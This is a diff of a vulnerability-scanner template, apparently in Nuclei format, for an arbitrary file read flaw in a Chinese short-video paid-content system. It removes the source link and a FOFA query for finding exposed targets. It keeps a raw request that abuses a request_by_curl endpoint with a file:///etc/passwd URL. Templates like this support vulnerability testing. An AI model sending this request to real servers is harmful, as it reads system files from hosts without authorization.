@@ -3,12 +3,8 @@ info:
   name: 短视频系统视频知识付费系统request_by_curl存在前台任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/doihxzfybq7f2zlf'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: doihxzfybq7f2zlf
-    fofa: '"testvideo://login?id="'
 http:
 - raw:
   - 'GET /index/index/request_by_curl?remote_server=file:///etc/passwd&post_string=1 HTTP/1.1
